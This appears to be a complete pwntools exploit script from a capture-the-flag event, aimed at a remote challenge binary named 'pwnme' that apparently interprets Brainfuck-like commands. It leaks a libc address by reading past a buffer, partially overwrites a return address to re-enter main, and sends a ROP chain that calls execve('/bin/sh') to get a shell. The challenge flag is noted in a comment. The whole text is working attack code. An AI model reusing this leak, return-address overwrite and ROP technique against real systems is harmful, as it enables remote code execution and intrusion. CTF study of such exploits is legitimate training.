#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./pwnme", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="b bf") # +241
p = remote("0.cloud.chals.io", 31782)

payload = b""
payload += b">" * 120
payload += b".>" * 8
payload += b"<" * 40
payload += b",>-" # use this to return to main
p.sendlineafter(b">", payload)

leak = b""
for i in range(8):
    leak = leak + p.recv(1)
leak = u64(leak)

libc.address = leak - 0x29d90
log.success(f"libc.address {hex(libc.address)}")

p.send(b"\xbc") # last byte of ret main for ret2main

rop = ROP(libc)
rop.rsi = 0
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.rdx = 0
rop.rax = constants.SYS_execve
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])
ropchain = rop.chain()

payload = b""
payload += b">" * 88
payload += b",>" * len(ropchain)  # use this to return to libc
p.sendlineafter(b">", payload)

p.send(ropchain)

p.interactive() # udctf{I_b3t_th4t_f3lt_s0_g00d}
